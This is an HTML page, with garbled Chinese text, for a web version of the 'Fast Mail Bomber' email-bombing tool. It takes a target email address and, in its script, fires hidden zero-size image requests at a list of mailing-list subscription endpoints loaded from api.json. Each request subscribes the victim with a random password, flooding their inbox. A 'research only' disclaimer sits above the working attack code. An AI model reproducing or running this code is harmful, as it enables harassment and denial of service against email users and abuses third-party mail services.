<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>é‚®ä»¶è½°ç‚¸æœº-åƒåœ¾é‚®ä»¶å‘é€å™¨</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/materialize-css@1.0.0/dist/css/materialize.min.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/materialize-css@1.0.0/dist/js/materialize.min.js"></script>
</head>
<body>
<div class="row" style="padding-top: 20px">
    <div class="col s12 m6 offset-m3">
        <div class="card">
            <div class="card-content">
                <p class="card-title">Wolf(ä»£å·ï¼‰é‚®ä»¶è½°ç‚¸æœº</p>
                <p>ä½ å¥½ï¼Œæˆ‘æ˜¯çš‡å¸ç¿ğŸŒ</p>
                <p>è¿™æ˜¯ä¸€ä¸ªFast Mail Bomberçš„ğŸ®ğŸºç½‘é¡µå®ä¾‹ã€‚
                    è‹¥è¦è·å¾—æ›´ç¨³å®šã€å¨åŠ›æ›´å¤§çš„æ•ˆæœï¼Œè¯·è‡ªè¡Œéƒ¨ç½²PHPç¼–å†™çš„Fast Mail Bomberã€‚ï¼ˆmacOSå°±ä¸ç”¨è€ƒè™‘äº†ï¼‰
                    <a target="_blank" href="https://github.com/juzeon/fast-mail-bomber/">GitHubåœ°å€</a>ï¼ˆå«ä¸­æ–‡æ–‡æ¡£ï¼‰</p>
                <p>åˆ«äººåœ¨åšå®¢ä¸Šå¯¹è¿™ä¸ªé¡¹ç›®çš„ä»‹ç»ï¼š<a target="_blank" href="https://blog.skyju.cc/post/introduce-the-new-fast-mail-bomber/">ä¼ é€é—¨</a></p>
                <p>æœ¬ç½‘é¡µç¤ºä¾‹å•æ¬¡æœ€å¤šèƒ½å‘é€<span id="node-count">{{åŠ è½½ä¸­...}}</span>å°é‚®ä»¶ã€‚ç”±äºæµè§ˆå™¨è·¨æºé™åˆ¶ï¼Œæ— æ³•åˆ¤æ–­å‘é€æˆåŠŸä¸å¤±è´¥ï¼Œè¯·åœ¨å¼€å§‹è½°ç‚¸å‰æ‰“å¼€F12æŸ¥çœ‹è¿›åº¦ã€‚</p>
                <p>ç½‘é¡µç‰ˆä»…ä¾›æµ‹è¯•ï¼Œç”±äºæµè§ˆå™¨çš„TLSã€HTTPSæ”¿ç­–ç­‰é™åˆ¶ï¼Œæ— æ³•å……åˆ†åˆ©ç”¨å…¨éƒ¨æ¥å£èŠ‚ç‚¹ï¼Œä½†æ˜¯ä»ç„¶ä¸å»ºè®®è€ƒè™‘è‡ªè¡Œéƒ¨ç½²Fast Mail Bomberã€‚</p>
                <p>æœ¬é¡¹ç›®æ°¸è¿œä¸ä¼šä»¥ä»»ä½•å½¢å¼ç›ˆåˆ©æˆ–æ¥å—æèµ ã€‚ç‰¹åˆ«é¸£è°¢å±…æ­£</p>
                <p><b>å…è´£å£°æ˜ï¼šä»…ä¾›å­¦æœ¯ç ”ç©¶ä½¿ç”¨ã€‚å¯¹äºè¿åç›¸å…³æ³•å¾‹ã€é€ æˆå±å®³çš„æ»¥ç”¨è¡Œä¸ºï¼Œå¼€å‘è€…ä¸è´Ÿä»»ä½•è´£ä»»ã€‚</b></p>
                <div class="divider" style="margin: 30px auto"></div>
                <div class="row">
                    <div class="input-field col s9">
                        <input type="email" id="email" class="" placeholder="email@example.com">
                        <label>ç›®æ ‡é‚®ç®±åœ°å€ï¼š</label>
                    </div>
                    <div class="input-field col s3">
                        <a href="#!" id="start-bombing" onclick="start_bombing($('#email').val())" class="btn waves-effect" disabled>å¼€å§‹è½°ç‚¸</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="iframe-container"></div>
<script>
    function generatePassword(length) {
        var result           = '';
        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for ( var i = 0; i < length; i++ ) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }
    function validateEmail(email) {
        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(String(email).toLowerCase());
    }
    function start_bombing(email){
        if(!validateEmail(email)){
            M.toast({html:'é‚®ç®±æ ¼å¼ä¸æ­£ç¡®'});
            return;
        }
        nodes.forEach(node => {
            var password=generatePassword(10);
            $('#iframe-container').append(`
                <img
                src='`+node+`?email=`+email+`&fullname=&pw=`+password+`&pw-conf=`+password+`&language=en&digest=0&email-button=Subscribe'
                width='0'
                height='0'></img>
            `);
        });
        M.toast({html:'å·²å¼€å§‹è½°ç‚¸ï¼Œè¯·ç­‰å¾…é¡µé¢åŠ è½½å®Œæˆ'});
        $('#start-bombing').attr('disabled',1);
    }
    var nodes=[];
    $(function () {
        $.ajax('api.json',{
            type:'get',
            success(data){
                nodes=data;
                M.toast({html:'è·å–åŠ å¼ºç‰ˆapi.jsonæˆåŠŸ'});
                $('#start-bombing').removeAttr('disabled');
                $('#node-count').text(nodes.length);
            },
            error(resp){
                M.toast({html:'ç½‘ç»œå‡ºé”™ï¼Œè¯·åˆ·æ–°é¡µé¢'});
            }
        })
    });
</script>
</body>
</html>